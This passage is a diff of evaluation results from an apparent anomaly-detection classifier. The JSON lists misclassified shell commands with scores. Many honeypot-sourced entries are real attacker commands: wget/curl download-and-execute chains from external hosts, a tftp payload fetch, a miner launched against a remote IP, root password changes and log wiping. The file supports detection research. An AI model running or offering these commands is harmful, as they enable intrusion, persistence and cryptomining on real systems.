         "source": "honeypot"
       },
       {
         "command": "nache2015",
-        "score": 0.29471954703330994,
+        "score": 0.29715409874916077,
         "source": "honeypot"
       },
       {
         "command": "37m ' ; '%(latency)s ms\\033[1",
-        "score": 0.3924013376235962,
+        "score": 0.3920842111110687,
         "source": "honeypot"
       },
       {
         "command": "wlcear",
-        "score": 0.16258512437343597,
+        "score": 0.16563349962234497,
         "source": "honeypot"
       },
       {
         "command": "pam-auth-update",
-        "score": 0.05328342691063881,
+        "score": 0.05309903249144554,
         "source": "honeypot"
       },
       {
         "command": "tar xvf dofailed: Connection refused.",
-        "score": 0.22250960767269135,
+        "score": 0.22237402200698853,
         "source": "honeypot"
       },
       {
         "command": "sudo inst cpan",
-        "score": 0.2930958867073059,
+        "score": 0.28863975405693054,
         "source": "honeypot"
       },
       {
         "command": "m') ; best = getBestServer(servers) ; if not args.simple: ; print_(('\\033[1",
-        "score": 0.4112071096897125,
+        "score": 0.409606397151947,
         "source": "honeypot"
       },
       {
         "command": "\"\"\" ; fp = kwargs.pop(\"file\", sys.stdout) ; if fp is None: ; return ; def write(data): ; if not isinstance(data, basestring): ; data = str(data) ; fp.write(data) ; want_unicode = False ; sep = kwargs.pop(\"sep\", None) ; if sep is not None: ; if isinstance(sep, unicode): ; want_unicode = True ; elif not isinstance(sep, str): ; raise TypeError(\"sep must be None or a string\") ; end = kwargs.pop(\"end\", None) ; if end is not None: ; if isinstance(end, unicode): ; want_unicode = True ; elif not isinstance(end, str): ; raise TypeError(\"end must be None or a string\") ; if kwargs: ; raise TypeError(\"invalid keyword arguments to print()\") ; if not want_unicode: ; for arg in args: ; if isinstance(arg, unicode): ; want_unicode = True ; break ; if want_unicode: ; newline = unicode(\"\\n\") ; space = unicode(\" \") ; else: ; newline = \"\\n\" ; space = \" \" ; if sep is None: ; sep = space ; if end is None: ; end = newline ; for i, arg in enumerate(args): ; if i: ; write(sep) ; write(arg) ; write(end) ; else: ; print_ = getattr(builtins, 'print') ; del builtins ; class SpeedtestCliServerListError(Exception): ; \"\"\"Internal Exception class used to indicate to move on to the next",
-        "score": 0.04157046228647232,
+        "score": 0.03990785405039787,
         "source": "honeypot"
       },
       {
         "command": "echo \"${WHI}# ${DRED}Ram ${DRED} -> ${WHI}${ram}MB [1024MB = 1GB]\" #${WHI}\" ; echo \"${WHI}# ${DRED}GPU ${DRED} -> ${WHI}${vid}\" ; echo \"${WHI}# ${DRED}DISK SPACE ${DRED} -> ${WHI}${DISK}\" ; echo \"${WHI}# ${DRED}Versiune ${DRED} -> ${WHI}${VER}\" ; echo \"${WHI}# ${DRED}Uptime ${DRED} -> ${WHI}${zile} Zile\" ; sleep 2 ; if ((${EUID:-0} || \"$(id -u)\")) ; then ; echo \"${WHI}#${DRED} Drept de root -> ${WHI}Nu ai\"\"${WHI} ${WHI}\" ; sleep 3 ; else ; echo \"${WHI}# ${DRED}Drept de root -> ${WHI}Ai ${WHI}\" ; fi ; sleep 3 ; echo \"${DRED}--------------------------------------------------------------------------${WHI}\" ; echo \"${WHI} | ${WHI}SPEED TESTUL INCEPE IN 3 SECUNDE | ${WHI}\" ; echo \"${DRED}--------------------------------------------------------------------------${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}1${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}2${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}3${WHI}\" ; sleep 1 ; wget nasapaul.com/v.py ; perl v.py y ; perl ninfo ; nano v.py ; #!/usr/bin/env python ; # -*- coding: utf-8 -*- ; # Copyright 2012-2017 Matt Martz ; # All Rights Reserved. ; # ; # Licensed under the Apache License, Version 2.0 (the \"License\") ; you may ; # not use this file except in compliance with the License. You may obtain ; # a copy of the License at ; # ; # http://hf44de385.example.net/licenses/LICENSE-2.0 ; # ; # Unless required by applicable law or agreed to in writing, software ; # distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT ; # WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the ; # License for the specific language governing permissions and limitations ; # under the License. ; # ; # ; # ; import os ; import re ; import sys ; import math ; import signal ; import socket ; import timeit ; import platform ; import threading ; __version__ = '0.3.4' ; # Some global variables we use ; user_agent = None ; source = None ; shutdown_event = None ; scheme = 'http' ; # Used for bound_interface ; socket_socket = socket.socket ; try: ; import xml.etree.cElementTree as ET ; except ImportError: ; try: ; import xml.etree.ElementTree as ET ; except ImportError: ; from xml.dom import minidom as DOM ; ET = None ; # Begin import game to handle Python 2 and Python 3 ; try: ; from urllib2 import urlopen, Request, HTTPError, URLError ; except ImportError: ; from urllib.request import urlopen, Request, HTTPError, URLError ; try: ; from httplib import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py2 = sys.exc_info() ; try: ; from http.client import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py3 = sys.exc_info() ; raise SystemExit('Your python installation is missing required HTTP ' ; 'client classes:\\n\\n' ; 'Python 2: %s\\n' ; 'Python 3: %s' % (e_http_py2[1], e_http_py3[1])) ; try: ; from Queue import Queue ; except ImportError: ; from queue import Queue ; try: ; from urlparse import urlparse ; except ImportError: ; from urllib.parse import urlparse ; try: ; from urlparse import parse_qs ; except ImportError: ; try: ; from urllib.parse import parse_qs ; except ImportError: ; from cgi import parse_qs ; try: ; from hashlib import md5 ; except ImportError: ; from md5 import md5 ; try: ; from argparse import ArgumentParser as ArgParser ; except ImportError: ; from optparse import OptionParser as ArgParser ; try: ; import builtins ; except ImportError: ; def print_(*args, **kwargs): ; \"\"\"The new-style print function taken from",
-        "score": 0.3738391101360321,
+        "score": 0.3750075101852417,
         "source": "honeypot"
       },
       {
         "command": "mkdir .z",
-        "score": 0.04206760227680206,
+        "score": 0.04113633185625076,
         "source": "honeypot"
       },
       {
         "command": "nohup /root/cong &gt",
-        "score": 0.4250405430793762,
+        "score": 0.42557069659233093,
         "source": "honeypot"
       },
       {
         "command": "m') ; print_('\\033[1",
-        "score": 0.4218955934047699,
+        "score": 0.41177797317504883,
         "source": "honeypot"
       },
       {
         "command": "sudo passwd -dl root",
-        "score": 0.056956805288791656,
+        "score": 0.05766671150922775,
         "source": "honeypot"
       },
       {
         "command": "This function automatically adds a User-Agent header to all requests",
-        "score": 0.02873954549431801,
+        "score": 0.028344199061393738,
         "source": "honeypot"
       },
       {
         "command": "for i in \"/bin\" \"/home\" \"/root\" \"/tmp\" \"/usr\" \"/etc\"",
-        "score": 0.1854351907968521,
+        "score": 0.18040797114372253,
         "source": "honeypot"
       },
       {
         "command": "rm -rf psybnc-linuxRO.tar",
-        "score": 0.46834447979927063,
+        "score": 0.47135698795318604,
         "source": "honeypot"
       },
       {
         "command": "echo $(uname -snmpr | tr \"\\n\" \" \"",
-        "score": 0.4254797101020813,
+        "score": 0.4172010123729706,
         "source": "honeypot"
       },
       {
         "command": "echo \"[+] Processor: \"[`uname -m`]\" ID:[`id -u`]\"",
-        "score": 0.15928588807582855,
+        "score": 0.15420083701610565,
         "source": "honeypot"
       },
       {
         "command": "establishing a connection with a HTTP/HTTPS request",
-        "score": 0.04273553937673569,
+        "score": 0.041024427860975266,
         "source": "honeypot"
       },
       {
         "command": "sudo suo",
-        "score": 0.18542467057704926,
+        "score": 0.18104536831378937,
         "source": "honeypot"
       },
       {
         "command": "kill -s od",
-        "score": 0.20542487502098083,
+        "score": 0.1982269138097763,
         "source": "honeypot"
       },
       {
         "command": "ls -a.txt",
-        "score": 0.03679453581571579,
+        "score": 0.03790120780467987,
         "source": "honeypot"
       },
       {
         "command": "amar",
-        "score": 0.13802239298820496,
+        "score": 0.13398787379264832,
         "source": "honeypot"
       },
       {
         "command": "at-get",
-        "score": 0.256308913230896,
+        "score": 0.2601080536842346,
         "source": "honeypot"
       },
       {
         "command": "vid=$(lspci | grep VGA | cut -f5- -d ' ')",
-        "score": 0.17085832357406616,
+        "score": 0.16366325318813324,
         "source": "honeypot"
       },
       {
         "command": "PuTTY Fatal Error",
-        "score": 0.40435829758644104,
+        "score": 0.410971999168396,
         "source": "honeypot"
       },
       {
         "command": "nano conff",
-        "score": 0.2788429856300354,
+        "score": 0.2818359136581421,
         "source": "honeypot"
       },
       {
         "command": "sudo passwd tecmin",
-        "score": 0.2740848958492279,
+        "score": 0.2701008915901184,
         "source": "honeypot"
       },
       {
         "command": "strings /usr/sbin/sshd | grep %s:%s -A2 -B2",
-        "score": 0.4865529239177704,
+        "score": 0.47270745038986206,
         "source": "honeypot"
       },
       {
         "command": "sysctl hw.model",
-        "score": 0.08081123977899551,
+        "score": 0.08374369144439697,
         "source": "honeypot"
       },
       {
         "command": "nano passfile",
-        "score": 0.21660561859607697,
+        "score": 0.21337823569774628,
         "source": "honeypot"
       },
       {
         "command": "python crack.py emails.txt 400 0",
-        "score": 0.004806678742170334,
+        "score": 0.004747394006699324,
         "source": "honeypot"
       },
       {
         "command": "ergergerge",
-        "score": 0.45466139912605286,
+        "score": 0.45889437198638916,
         "source": "honeypot"
       }
     ],
     "false_positives": [
       {
         "command": "Zsh",
-        "score": 0.9027938842773438,
+        "score": 0.9036933779716492,
         "source": "bash_history"
       },
       {
         "command": "dpigs",
-        "score": 0.6418598294258118,
+        "score": 0.6465347409248352,
         "source": "commandlinefu"
       },
       {
         "command": "cp ~/.functions bash/",
-        "score": 0.7563585042953491,
+        "score": 0.7609968185424805,
         "source": "bash_history"
       },
       {
         "command": "tar -zxvf 'download (1)'",
-        "score": 0.6982085108757019,
+        "score": 0.6924353837966919,
         "source": "bash_history"
       },
       {
         "command": "spotify",
-        "score": 0.5355533361434937,
+        "score": 0.5167468190193176,
         "source": "bash_history"
       },
       {
         "command": "rm -rf /usr/bin/python",
-        "score": 0.7222885489463806,
+        "score": 0.7109389305114746,
         "source": "bash_history"
       },
       {
         "command": "bash quiz.sh",
-        "score": 0.9579856395721436,
+        "score": 0.9582810401916504,
         "source": "bash_history"
       },
       {
         "command": "nslookup cnn.com 27.75.34.196",
-        "score": 0.570408284664154,
+        "score": 0.5751596689224243,
         "source": "bash_history"
       },
       {
         "command": "rm -rf run",
-        "score": 0.7786000967025757,
+        "score": 0.7778185606002808,
         "source": "bash_history"
       },
       {
         "command": "./zombie.c",
-        "score": 0.7237512469291687,
+        "score": 0.7229432463645935,
         "source": "bash_history"
       },
       {
         "command": ":wq",
-        "score": 0.8272457718849182,
+        "score": 0.8276164531707764,
         "source": "bash_history"
       },
       {
         "command": "chmod +x case",
-        "score": 0.7669348120689392,
+        "score": 0.7795062065124512,
         "source": "bash_history"
       },
       {
         "command": "chmod u+x ./ldr",
-        "score": 0.9219101667404175,
+        "score": 0.9176235198974609,
         "source": "bash_history"
       },
       {
         "command": "echo $((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))",
-        "score": 0.8180593252182007,
+        "score": 0.818625271320343,
         "source": "commandlinefu"
       },
       {
         "command": "chmod +x maven.sh",
-        "score": 0.743558943271637,
+        "score": 0.7434020042419434,
         "source": "bash_history"
       },
       {
         "command": "chomd 777",
-        "score": 0.9452029466629028,
+        "score": 0.9438493251800537,
         "source": "bash_history"
       },
       {
         "command": "rm -rf smecherit.tgz",
-        "score": 0.5159466862678528,
+        "score": 0.5194291472434998,
         "source": "bash_history"
       },
       {
         "command": "pw",
-        "score": 0.8253397345542908,
+        "score": 0.8248708248138428,
         "source": "bash_history"
       },
       {
         "command": "bash -x script.sh 2> log",
-        "score": 0.5059422254562378,
+        "score": 0.5108274817466736,
         "source": "commandlinefu"
       },
       {
         "command": "tar zxvf udp.tgz",
-        "score": 0.7724423408508301,
+        "score": 0.7723432183265686,
         "source": "bash_history"
       },
       {
         "command": "tar xvf ha.tgz",
-        "score": 0.9071539044380188,
+        "score": 0.9067254662513733,
         "source": "bash_history"
       },
       {
         "command": "zxi",
-        "score": 0.8778184056282043,
+        "score": 0.8780094981193542,
         "source": "bash_history"
       },
       {
         "command": "bashmount",
-        "score": 0.8571373820304871,
+        "score": 0.8509764075279236,
         "source": "bash_history"
       },
       {
         "command": "cta",
-        "score": 0.5698332786560059,
+        "score": 0.5663509368896484,
         "source": "bash_history"
       },
       {
         "command": "/var/log/syslog",
-        "score": 0.9370501637458801,
+        "score": 0.9335344433784485,
         "source": "bash_history"
       },
       {
         "command": "chmod +x arquivobin",
-        "score": 0.8111819624900818,
+        "score": 0.807442307472229,
         "source": "bash_history"
       },
       {
         "command": "cp /etc/wgetrc /top/",
-        "score": 0.6946306228637695,
+        "score": 0.7026735544204712,
         "source": "bash_history"
       },
       {
         "command": "/etc/xinetd.d/",
-        "score": 0.611382246017456,
+        "score": 0.6157821416854858,
         "source": "bash_history"
       },
       {
         "command": "kill -9 13165 14773 32627",
-        "score": 0.7728775143623352,
+        "score": 0.7676689028739929,
         "source": "bash_history"
       },
       {
         "command": "chmod +x diretorio",
-        "score": 0.5663486123085022,
+        "score": 0.5624080300331116,
         "source": "bash_history"
       },
       {
         "command": "utmpdump /var/log/wtmp",
-        "score": 0.901882529258728,
+        "score": 0.9018748998641968,
         "source": "commandlinefu"
       },
       {
         "command": "rm -rf .bot",
-        "score": 0.6998671889305115,
+        "score": 0.6882719993591309,
         "source": "bash_history"
       },
       {
         "command": "wget -r -P ./dl/ -A jpg,jpeg http://h71ba300d.example.net",
-        "score": 0.8363634943962097,
+        "score": 0.8349625468254089,
         "source": "commandlinefu"
       },
       {
         "command": "ip_subnet: '188.115.1.173/24'",
-        "score": 0.743263840675354,
+        "score": 0.7474542856216431,
         "source": "bash_history"
       },
       {
         "command": "sh add_num.sh 10",
-        "score": 0.5664193034172058,
+        "score": 0.5680884122848511,
         "source": "bash_history"
       },
       {
         "command": "IPYTHON",
-        "score": 0.746576189994812,
-        "source": "bash_history"
-      },
-      {
-        "command": "ls/",
-        "score": 0.501352846622467,
+        "score": 0.7525290846824646,
         "source": "bash_history"
       },
       {
         "command": "tar zxvf segher3.tgz",
-        "score": 0.7676162123680115,
+        "score": 0.7725074291229248,
         "source": "bash_history"
       },
       {
         "command": "perl .a.txt",
-        "score": 0.8848962783813477,
+        "score": 0.8815906047821045,
         "source": "bash_history"
       },
       {
         "command": "zhs",
-        "score": 0.5685221552848816,
+        "score": 0.5744408369064331,
+        "source": "bash_history"
+      },
+      {
+        "command": "bash function.sh",
+        "score": 0.7218172550201416,
+        "source": "bash_history"
+      }
+    ]
+  },
+  "random_forest/dataset2": {
+    "false_negatives": [
+      {
+        "command": "nano u.txt",
+        "score": 0.23251241992255564,
+        "source": "honeypot"
+      },
+      {
+        "command": "31m>>>> Server Gasit incepem Testele \\033[1",
+        "score": 0.32239678198299493,
+        "source": "honeypot"
+      },
+      {
+        "command": "cat tmp.rwG6eULB7M.sh",
+        "score": 0.3252995521169163,
+        "source": "honeypot"
+      },
+      {
+        "command": "echo \"cd /tmp ; wget http://h060a0744.example.net/wget.sh || curl http://h060a0744.example.net/curl.sh -o curl.sh ; chmod +x *.sh ; ./wget.sh ; ./curl.sh\" | sh",
+        "score": 0.37,
+        "source": "honeypot"
+      },
+      {
+        "command": "unzip nasa.zip",
+        "score": 0.24105754991096073,
+        "source": "honeypot"
+      },
+      {
+        "command": "nproo",
+        "score": 0.44916529412226763,
+        "source": "honeypot"
+      },
+      {
+        "command": "ls -1 /etc/pam.d",
+        "score": 0.1681122098241503,
+        "source": "honeypot"
+      },
+      {
+        "command": "xz",
+        "score": 0.4256291327878825,
+        "source": "honeypot"
+      },
+      {
+        "command": "rm -rf read.txt*",
+        "score": 0.39899704365740424,
+        "source": "honeypot"
+      },
+      {
+        "command": "pkill -f cyber",
+        "score": 0.27480962160698674,
+        "source": "honeypot"
+      },
+      {
+        "command": "tar xvf miner.tar",
+        "score": 0.1957126857344435,
+        "source": "honeypot"
+      },
+      {
+        "command": "distance",
+        "score": 0.3209554359271828,
+        "source": "honeypot"
+      },
+      {
+        "command": "chmod +x sshdsservers",
+        "score": 0.13804440695858342,
+        "source": "honeypot"
+      },
+      {
+        "command": "darkness",
+        "score": 0.3209554359271828,
+        "source": "honeypot"
+      },
+      {
+        "command": "head -v -n 8 /proc/meminfo",
+        "score": 0.2931269850696314,
+        "source": "honeypot"
+      },
+      {
+        "command": "chmod u+x syn2023",
+        "score": 0.4769459585506938,
+        "source": "honeypot"
+      },
+      {
+        "command": "tar xzvf m,ix.tgz",
+        "score": 0.1821280017960171,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd Desktop",
+        "score": 0.3392970757111107,
+        "source": "honeypot"
+      },
+      {
+        "command": "setuserpasswd root VivBPucWpUL",
+        "score": 0.22205522286583448,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd /usr/bin/",
+        "score": 0.4758929536746082,
+        "source": "honeypot"
+      },
+      {
+        "command": "37m ' ; '%(latency)s ms\\033[1",
+        "score": 0.1718587689227935,
+        "source": "honeypot"
+      },
+      {
+        "command": "pam-auth-update",
+        "score": 0.1374529638693283,
+        "source": "honeypot"
+      },
+      {
+        "command": "flash set SSH_PASSWORD c6bnrTNheEod",
+        "score": 0.2962292123763237,
+        "source": "honeypot"
+      },
+      {
+        "command": "tar xvf dofailed: Connection refused.",
+        "score": 0.046897923492317244,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd /var/run",
+        "score": 0.26936508443727336,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd 64",
+        "score": 0.2450790577631899,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd /bishn/",
+        "score": 0.18995290927429792,
+        "source": "honeypot"
+      },
+      {
+        "command": "download",
+        "score": 0.3209554359271828,
+        "source": "honeypot"
+      },
+      {
+        "command": "sudo inst cpan",
+        "score": 0.0937344828444068,
+        "source": "honeypot"
+      },
+      {
+        "command": "m') ; best = getBestServer(servers) ; if not args.simple: ; print_(('\\033[1",
+        "score": 0.02912712660959231,
+        "source": "honeypot"
+      },
+      {
+        "command": "LC_ALL=C ss -tln",
+        "score": 0.2840241542441309,
+        "source": "honeypot"
+      },
+      {
+        "command": "./x86 Servers",
+        "score": 0.2641801211053399,
+        "source": "honeypot"
+      },
+      {
+        "command": "./k1337.x86",
+        "score": 0.43441144108850566,
+        "source": "honeypot"
+      },
+      {
+        "command": "lwp-download http://h7642432e.example.net/2start.jpg /tmp/2start.jpg",
+        "score": 0.45,
+        "source": "honeypot"
+      },
+      {
+        "command": "LC_ALL=C /home/admin/.dhpcd -o 76.132.177.92:4444 -t4 --safe -B >/dev/null 2>/dev/null",
+        "score": 0.395,
+        "source": "honeypot"
+      },
+      {
+        "command": "sys password 0fj8Hx6W4yH",
+        "score": 0.2219563669912492,
+        "source": "honeypot"
+      },
+      {
+        "command": "echo \"${WHI}# ${DRED}Ram ${DRED} -> ${WHI}${ram}MB [1024MB = 1GB]\" #${WHI}\" ; echo \"${WHI}# ${DRED}GPU ${DRED} -> ${WHI}${vid}\" ; echo \"${WHI}# ${DRED}DISK SPACE ${DRED} -> ${WHI}${DISK}\" ; echo \"${WHI}# ${DRED}Versiune ${DRED} -> ${WHI}${VER}\" ; echo \"${WHI}# ${DRED}Uptime ${DRED} -> ${WHI}${zile} Zile\" ; sleep 2 ; if ((${EUID:-0} || \"$(id -u)\")) ; then ; echo \"${WHI}#${DRED} Drept de root -> ${WHI}Nu ai\"\"${WHI} ${WHI}\" ; sleep 3 ; else ; echo \"${WHI}# ${DRED}Drept de root -> ${WHI}Ai ${WHI}\" ; fi ; sleep 3 ; echo \"${DRED}--------------------------------------------------------------------------${WHI}\" ; echo \"${WHI} | ${WHI}SPEED TESTUL INCEPE IN 3 SECUNDE | ${WHI}\" ; echo \"${DRED}--------------------------------------------------------------------------${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}1${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}2${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}3${WHI}\" ; sleep 1 ; wget nasapaul.com/v.py ; perl v.py y ; perl ninfo ; nano v.py ; #!/usr/bin/env python ; # -*- coding: utf-8 -*- ; # Copyright 2012-2017 Matt Martz ; # All Rights Reserved. ; # ; # Licensed under the Apache License, Version 2.0 (the \"License\") ; you may ; # not use this file except in compliance with the License. You may obtain ; # a copy of the License at ; # ; # http://hf44de385.example.net/licenses/LICENSE-2.0 ; # ; # Unless required by applicable law or agreed to in writing, software ; # distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT ; # WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the ; # License for the specific language governing permissions and limitations ; # under the License. ; # ; # ; # ; import os ; import re ; import sys ; import math ; import signal ; import socket ; import timeit ; import platform ; import threading ; __version__ = '0.3.4' ; # Some global variables we use ; user_agent = None ; source = None ; shutdown_event = None ; scheme = 'http' ; # Used for bound_interface ; socket_socket = socket.socket ; try: ; import xml.etree.cElementTree as ET ; except ImportError: ; try: ; import xml.etree.ElementTree as ET ; except ImportError: ; from xml.dom import minidom as DOM ; ET = None ; # Begin import game to handle Python 2 and Python 3 ; try: ; from urllib2 import urlopen, Request, HTTPError, URLError ; except ImportError: ; from urllib.request import urlopen, Request, HTTPError, URLError ; try: ; from httplib import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py2 = sys.exc_info() ; try: ; from http.client import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py3 = sys.exc_info() ; raise SystemExit('Your python installation is missing required HTTP ' ; 'client classes:\\n\\n' ; 'Python 2: %s\\n' ; 'Python 3: %s' % (e_http_py2[1], e_http_py3[1])) ; try: ; from Queue import Queue ; except ImportError: ; from queue import Queue ; try: ; from urlparse import urlparse ; except ImportError: ; from urllib.parse import urlparse ; try: ; from urlparse import parse_qs ; except ImportError: ; try: ; from urllib.parse import parse_qs ; except ImportError: ; from cgi import parse_qs ; try: ; from hashlib import md5 ; except ImportError: ; from md5 import md5 ; try: ; from argparse import ArgumentParser as ArgParser ; except ImportError: ; from optparse import OptionParser as ArgParser ; try: ; import builtins ; except ImportError: ; def print_(*args, **kwargs): ; \"\"\"The new-style print function taken from",
+        "score": 0.2325,
+        "source": "honeypot"
+      },
+      {
+        "command": "which uptime",
+        "score": 0.09695808284607846,
+        "source": "honeypot"
+      },
+      {
+        "command": "ore=$(( uptime/60/60%24 ))",
+        "score": 0.42755721004406305,
+        "source": "honeypot"
+      },
+      {
+        "command": "grep bash /etc/passwd",
+        "score": 0.41147437623784033,
+        "source": "honeypot"
+      }
+    ],
+    "false_positives": [
+      {
+        "command": "Zsh",
+        "score": 0.5114036319451094,
+        "source": "bash_history"
+      },
+      {
+        "command": "exercicio1403",
+        "score": 0.509770654548872,
+        "source": "bash_history"
+      },
+      {
+        "command": "python ldr2.0",
+        "score": 0.6849222056215344,
+        "source": "bash_history"
+      },
+      {
+        "command": "~<TAB>",
+        "score": 0.6132040181208341,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "ll /lib",
+        "score": 0.8787523897940559,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf run",
+        "score": 0.9535542578983781,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm git",
+        "score": 0.7490929142854895,
+        "source": "bash_history"
+      },
+      {
+        "command": ":wq",
+        "score": 0.7690158855959781,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm MyNewProject/ -rf",
+        "score": 0.5200574960674954,
+        "source": "bash_history"
+      },
+      {
+        "command": "j voya",
+        "score": 0.8127010109072476,
+        "source": "bash_history"
+      },
+      {
+        "command": "arch",
+        "score": 0.5985400077843056,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "suso s",
+        "score": 0.8127010109072476,
+        "source": "bash_history"
+      },
+      {
+        "command": "chomd 777",
+        "score": 0.7284573863546098,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf smecherit.tgz",
+        "score": 0.9183609577127478,
+        "source": "bash_history"
+      },
+      {
+        "command": "curl --ntlm -u DOMAIN/user https://he9da8524.example.net/path/to/file",
+        "score": 0.5375,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "uberwriter",
+        "score": 0.8115941517855881,
+        "source": "bash_history"
+      },
+      {
+        "command": "tar zxvf udp.tgz",
+        "score": 0.7954637350113595,
+        "source": "bash_history"
+      },
+      {
+        "command": "tar xvf ha.tgz",
+        "score": 0.6418614880705374,
+        "source": "bash_history"
+      },
+      {
+        "command": "ls .cu",
+        "score": 0.9852243105023348,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm Image",
+        "score": 0.6412452605660427,
+        "source": "bash_history"
+      },
+      {
+        "command": "bashmount",
+        "score": 0.798305107850148,
+        "source": "bash_history"
+      },
+      {
+        "command": "rpm -qa wget",
+        "score": 0.5239247377689285,
+        "source": "bash_history"
+      },
+      {
+        "command": "utmpdump /var/log/wtmp",
+        "score": 0.7981948119954845,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "ls .bazaar/",
+        "score": 0.7140560082591892,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf .bot",
+        "score": 0.5714424306527754,
+        "source": "bash_history"
+      },
+      {
+        "command": "mkdir .themes",
+        "score": 0.5455741413798182,
+        "source": "bash_history"
+      },
+      {
+        "command": "cp /home/group/.git/ /home/silar/.git",
+        "score": 0.6887519743692847,
+        "source": "bash_history"
+      },
+      {
+        "command": "brew install wget",
+        "score": 0.5791943563785807,
+        "source": "bash_history"
+      },
+      {
+        "command": "sh add_num.sh 10",
+        "score": 0.7577820821149106,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf .borwind",
+        "score": 0.8820009489711869,
+        "source": "bash_history"
+      },
+      {
+        "command": "ll]",
+        "score": 0.7690158855959781,
+        "source": "bash_history"
+      },
+      {
+        "command": "be rake",
+        "score": 0.7808784291064632,
+        "source": "bash_history"
+      },
+      {
+        "command": "python dns.py -h",
+        "score": 0.5199381534377927,
+        "source": "bash_history"
+      },
+      {
+        "command": "ls/",
+        "score": 0.8502020559532363,
+        "source": "bash_history"
+      },
+      {
+        "command": "perl .a.txt",
+        "score": 0.8660592056757181,
+        "source": "bash_history"
+      },
+      {
+        "command": "scp -C 56.181.59.25:/tmp/backup.sql /path/to/backup.sql",
+        "score": 0.535,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "rm wc",
+        "score": 0.7142933792620094,
+        "source": "bash_history"
+      },
+      {
+        "command": "bash function.sh",
+        "score": 0.9152773996674118,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf l_*",
+        "score": 0.8459103713273721,
+        "source": "bash_history"
+      },
+      {
+        "command": "cfce4-terminal&",
+        "score": 0.5023784239563612,
+        "source": "bash_history"
+      }
+    ]
+  },
+  "isolation_forest/dataset2": {
+    "false_negatives": [
+      {
+        "command": "nano u.txt",
+        "score": 0.0026463304430919057,
+        "source": "honeypot"
+      },
+      {
+        "command": "/bin/busybox echo -e '\\x47\\x72\\x6f\\x70/sys/firmware' > /sys/firmware/.nippon",
+        "score": 0.4491671905760568,
+        "source": "honeypot"
+      },
+      {
+        "command": "./.dhpcd",
+        "score": 0.12245123567171737,
+        "source": "honeypot"
+      },
+      {
+        "command": "31m>>>> Server Gasit incepem Testele \\033[1",
+        "score": 0.04956452817793168,
+        "source": "honeypot"
+      },
+      {
+        "command": "/gisdfoewrsfdf",
+        "score": 0.03772789185761928,
+        "source": "honeypot"
+      },
+      {
+        "command": "cat /dev/null > /var/log/yum.log",
+        "score": 0.09591885407957633,
+        "source": "honeypot"
+      },
+      {
+        "command": "./nf88BWF9",
+        "score": 0.038734014256484144,
+        "source": "honeypot"
+      },
+      {
+        "command": "who | gzip | base64",
+        "score": 0.13900881691586317,
+        "source": "honeypot"
+      },
+      {
+        "command": "rm -rf /var/tmp/dota*",
+        "score": 0.37957430132721753,
+        "source": "honeypot"
+      },
+      {
+        "command": "./ygljglkjgfg0",
+        "score": 0.020577073018986307,
+        "source": "honeypot"
+      },
+      {
+        "command": "bash -c ./ptUehrfk",
+        "score": 0.4202406409887271,
+        "source": "honeypot"
+      },
+      {
+        "command": "cat tmp.rwG6eULB7M.sh",
+        "score": 0.010289768822248403,
+        "source": "honeypot"
+      },
+      {
+        "command": "unzip nasa.zip",
+        "score": 0.001953624811496615,
+        "source": "honeypot"
+      },
+      {
+        "command": "nproo",
+        "score": 0.012917057330673446,
+        "source": "honeypot"
+      },
+      {
+        "command": "tftp -r tftp2.sh -g 21.183.167.151",
+        "score": 0.2873219360685868,
+        "source": "honeypot"
+      },
+      {
+        "command": "ls -1 /etc/pam.d",
+        "score": 0.02775118959292232,
+        "source": "honeypot"
+      },
+      {
+        "command": "/bin/busybox cat /proc/sched_debug/.nippon",
+        "score": 0.25762952087766405,
+        "source": "honeypot"
+      },
+      {
+        "command": "xz",
+        "score": 0.028052217194218527,
+        "source": "honeypot"
+      },
+      {
+        "command": "wget http://h7642432e.example.net/hxx",
+        "score": 0.24579276656703386,
+        "source": "honeypot"
+      },
+      {
+        "command": "rm -rf read.txt*",
+        "score": 0.128651432500629,
+        "source": "honeypot"
+      },
+      {
+        "command": "./VEYWaqHT",
+        "score": 0.010918898322439334,
+        "source": "honeypot"
+      },
+      {
+        "command": "chmod 0777 syn2023",
+        "score": 0.17387821931529482,
+        "source": "honeypot"
+      },
+      {
+        "command": "/bin/busybox cat /proc/sysrq-trigger/.nippon",
+        "score": 0.26813664731542636,
+        "source": "honeypot"
+      },
+      {
+        "command": "/bin/busybox cat /proc/keys/.none",
+        "score": 0.25043200989187264,
+        "source": "honeypot"
+      },
+      {
+        "command": "/bin/busybox rm -f /etc/hostname/.nippon",
+        "score": 0.20692662531751907,
+        "source": "honeypot"
+      },
+      {
+        "command": "rm -rf sh",
+        "score": 0.2565911755413565,
+        "source": "honeypot"
+      },
+      {
+        "command": "pkill -f cyber",
+        "score": 0.005455256987366479,
+        "source": "honeypot"
+      },
+      {
+        "command": "./u40iqkxK",
